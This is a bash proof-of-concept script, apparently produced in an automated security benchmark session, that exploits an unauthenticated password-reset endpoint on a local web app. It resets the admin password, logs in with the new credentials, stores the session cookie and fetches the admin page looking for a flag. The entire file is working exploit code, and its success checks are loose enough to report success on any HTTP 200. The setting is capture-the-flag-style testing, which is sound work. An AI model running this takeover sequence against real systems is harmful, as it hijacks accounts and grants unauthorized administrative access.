#!/bin/bash
# POC: Demonstrates unauthenticated password reset vulnerability on /internal/update endpoint. Shows complete authentication bypass by resetting admin password without authentication.
# Target: ./repo
# Created: 2025-11-04T19:39:32.404Z
# Session: benchmark-XBEN-024-24-mhkyvn4q

# Authentication Bypass - Unauthenticated Password Reset POC
# Demonstrates the /internal/update endpoint vulnerability that allows
# resetting any user's password without authentication

TARGET_URL="${1:-http://localhost:5000}"
ADMIN_USER="admin"
NEW_PASSWORD="hacked123"

echo "[*] Authentication Bypass - Password Reset Vulnerability POC"
echo "[*] Target: $TARGET_URL"
echo ""

# Step 1: Attempt to reset admin password without authentication
echo "[*] Step 1: Attempting unauthenticated password reset for admin user"
echo "[*] Command: curl -s '$TARGET_URL/internal/update?username=$ADMIN_USER&newpassword=$NEW_PASSWORD'"
echo ""

RESPONSE=$(curl -s "$TARGET_URL/internal/update?username=$ADMIN_USER&newpassword=$NEW_PASSWORD")
HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET_URL/internal/update?username=$ADMIN_USER&newpassword=$NEW_PASSWORD")

echo "[*] HTTP Status Code: $HTTP_CODE"
echo "[*] Response: $RESPONSE"
echo ""

# Check if password reset was successful
if [[ "$RESPONSE" == *"successfully"* ]] || [[ "$HTTP_CODE" == "200" ]]; then
    echo "[+] SUCCESS: Password reset endpoint is vulnerable!"
    echo "[+] Admin password has been reset to: $NEW_PASSWORD"
    echo ""
    
    # Step 2: Attempt login with new credentials to verify
    echo "[*] Step 2: Verifying authentication bypass by logging in with new credentials"
    echo "[*] Command: curl -s -c /tmp/cookies.txt -d 'username=$ADMIN_USER&password=$NEW_PASSWORD' '$TARGET_URL/login'"
    echo ""
    
    LOGIN_RESPONSE=$(curl -s -c /tmp/cookies.txt -d "username=$ADMIN_USER&password=$NEW_PASSWORD" "$TARGET_URL/login")
    LOGIN_HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" -c /tmp/cookies.txt -d "username=$ADMIN_USER&password=$NEW_PASSWORD" "$TARGET_URL/login")
    
    echo "[*] Login HTTP Status Code: $LOGIN_HTTP_CODE"
    echo "[*] Login Response (first 200 chars): ${LOGIN_RESPONSE:0:200}"
    echo ""
    
    if [[ "$LOGIN_HTTP_CODE" == "200" ]] || [[ "$LOGIN_RESPONSE" == *"logged in"* ]] || [[ "$LOGIN_RESPONSE" == *"success"* ]]; then
        echo "[+] CONFIRMED: Authentication bypass successful!"
        echo "[+] Attacker can now access admin account with new credentials"
        
        # Step 3: Try to access protected admin resources
        echo ""
        echo "[*] Step 3: Attempting to access protected admin resources"
        ADMIN_RESPONSE=$(curl -s -b /tmp/cookies.txt "$TARGET_URL/admin")
        
        if [[ "$ADMIN_RESPONSE" == *"FLAG"* ]] || [[ "$ADMIN_RESPONSE" == *"admin"* ]] || [[ ! -z "$ADMIN_RESPONSE" ]]; then
            echo "[+] Successfully accessed protected admin resources"
            echo "[+] Admin response (first 300 chars): ${ADMIN_RESPONSE:0:300}"
        fi
    fi
    
    echo ""
    echo "[!] VULNERABILITY CONFIRMED: Complete authentication bypass via unauthenticated password reset"
else
    echo "[-] Password reset endpoint returned unexpected response"
    echo "[-] HTTP Code: $HTTP_CODE"
    echo "[-] Response: $RESPONSE"
    exit 1
fi